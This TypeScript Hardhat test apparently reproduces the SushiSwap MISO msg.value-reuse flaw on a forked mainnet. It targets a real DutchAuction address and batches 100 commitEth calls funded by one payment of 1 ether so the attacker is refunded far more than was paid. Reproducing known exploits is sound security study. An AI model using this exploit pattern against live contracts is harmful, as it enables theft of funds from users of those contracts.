import { ethers } from 'hardhat'
import { expect } from 'chai'
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers'
import { DutchAuction } from '../typechain-types'
import { resetFork } from './helpers/utils'

const BLOCK_NUMBER = 13036534
const mainnetDuctchAuctionAddress = '0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e'

const toWei = ethers.utils.parseEther

describe('SushiSwap Miso: msg.value reused vulnerability', async function () {
  let attacker: SignerWithAddress
  let user: SignerWithAddress
  let auction: DutchAuction
  before(async function () {
    await resetFork(BLOCK_NUMBER)
    ;[attacker, user] = await ethers.getSigners()
    auction = (await ethers.getContractFactory('contracts/MsgValueReuse/DutchAuction.sol:DutchAuction')).attach(
      mainnetDuctchAuctionAddress
    ) as DutchAuction

    await ethers.provider.send('hardhat_setBalance', [user.address, '0xffffffffffffffffffffff'])
    expect(await auction.isOpen()).to.be.true

    const clearingPrice = await auction.priceFunction()
    const totalTokens = await auction.getTotalTokens()
    const maxCommitment = totalTokens.mul(clearingPrice).div(toWei('1'))
    // commits ETH up to the maximum commits to enable refunds
    await auction.connect(user).commitEth(user.address, true, { value: maxCommitment })
    // commitments total is greater than maxCommitment, it should return Zero
    const commitment = await auction.calculateCommitment(toWei('1'))
  })
  afterEach(async function () {
    await resetFork(BLOCK_NUMBER)
  })

  it('Attack:only send 1 ether and get refunded much more ether', async function () {
    const attackerBalBefore = await ethers.provider.getBalance(attacker.address)
    const contractBalBefore = await ethers.provider.getBalance(auction.address)

    const numberOfCalls = 100
    // Calling the batch function of the vulnerable contract.
    // This essentially will call the commitEth function multiple times, always using the same amount of ETH.
    // get refunded whole 1 * numberOfCalls ether
    const callData = new Array(numberOfCalls).fill(
      auction.interface.encodeFunctionData('commitEth', [attacker.address, true])
    )
    await auction.connect(attacker).batch(callData, true, { value: toWei('1') })

    expect(await ethers.provider.getBalance(auction.address)).to.be.lt(contractBalBefore)
    expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(attackerBalBefore)
  })
})
